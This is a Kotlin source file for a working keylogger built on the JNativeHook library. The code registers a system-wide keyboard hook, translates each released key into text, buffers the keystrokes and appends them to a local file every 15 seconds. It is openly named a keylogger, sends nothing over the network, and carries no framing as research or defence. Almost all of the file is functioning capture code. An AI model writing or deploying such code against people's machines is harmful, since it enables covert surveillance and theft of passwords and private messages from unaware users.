package np.com.mithunadhikari

import com.github.kwhat.jnativehook.GlobalScreen
import com.github.kwhat.jnativehook.NativeHookException
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener
import java.awt.Toolkit
import java.io.File
import java.io.FileNotFoundException
import java.io.FileOutputStream
import java.io.PrintStream
import kotlin.concurrent.fixedRateTimer

class Main : NativeKeyListener {

    private val keystrokesBuffer = StringBuilder()
    private val outputFile = File("output.txt")

    companion object {
        @JvmStatic
        fun main(args: Array<String>) {
            Main().startKeylogger()
        }
    }

    private fun startKeylogger() {
        try {
            val fos = FileOutputStream(outputFile, true)
            System.setOut(PrintStream(fos))
            GlobalScreen.registerNativeHook()
            GlobalScreen.addNativeKeyListener(this)

            // Start a timer to write to the file every 15 seconds
            fixedRateTimer("KeyloggerTimer", false, 0L, 15000L) {
                writeKeystrokesToFile()
            }

        } catch (e: FileNotFoundException) {
            e.printStackTrace()
        } catch (e: NativeHookException) {
            e.printStackTrace()
        }
    }

    override fun nativeKeyReleased(p0: NativeKeyEvent?) {
        if (p0 == null) return
        val key = NativeKeyEvent.getKeyText(p0.keyCode)
        val formatted: String?
        when (key) {
            Toolkit.getProperty("AWT.tab", "Tab") -> formatted = "\t"
            Toolkit.getProperty("AWT.enter", "Enter") -> formatted = "\n"
            Toolkit.getProperty("AWT.space", "Space") -> formatted = " "
            Toolkit.getProperty("AWT.backspace", "Backspace") -> {
                formatted = ""
                if (keystrokesBuffer.isNotEmpty()) {
                    keystrokesBuffer.deleteCharAt(keystrokesBuffer.length - 1)
                }
            }

            Toolkit.getProperty("AWT.openBracket", "Open Bracket") -> formatted = "["
            Toolkit.getProperty("AWT.closeBracket", "Close Bracket") -> formatted = "]"
            Toolkit.getProperty("AWT.control", "Control") -> formatted = "Ctrl "
            Toolkit.getProperty("AWT.semicolon", "Semicolon") -> formatted = ";"
            Toolkit.getProperty("AWT.comma", "Comma") -> formatted = ","
            Toolkit.getProperty("AWT.period", "Period") -> formatted = "."
            Toolkit.getProperty("AWT.slash", "Slash") -> formatted = "/"
            Toolkit.getProperty("AWT.shift", "Shift") -> formatted = ""
            Toolkit.getProperty("AWT.underscore", "Underscore") -> formatted = "_"
            Toolkit.getProperty("AWT.hyphen", "Hyphen") -> formatted = "-"
            Toolkit.getProperty("AWT.up", "Up") -> formatted = "↑"
            Toolkit.getProperty("AWT.down", "Down") -> formatted = "↓ "
            Toolkit.getProperty("AWT.left", "Left") -> formatted = "← "
            Toolkit.getProperty("AWT.right", "Right") -> formatted = "→"
            Toolkit.getProperty("AWT.delete", "Delete") -> formatted = "Del"
            Toolkit.getProperty("AWT.escape", "Escape") -> formatted = "~"
            else -> formatted = key
        }

        keystrokesBuffer.append(formatted)
    }


    // Move the function outside the companion object
    @Synchronized
    private fun writeKeystrokesToFile() {
        if (keystrokesBuffer.isNotEmpty()) {
            FileOutputStream(outputFile, true).bufferedWriter().use { writer ->
                writer.write("\n")
                writer.write(keystrokesBuffer.toString())
            }
            keystrokesBuffer.clear() // Clear the buffer after writing
        }
    }
}
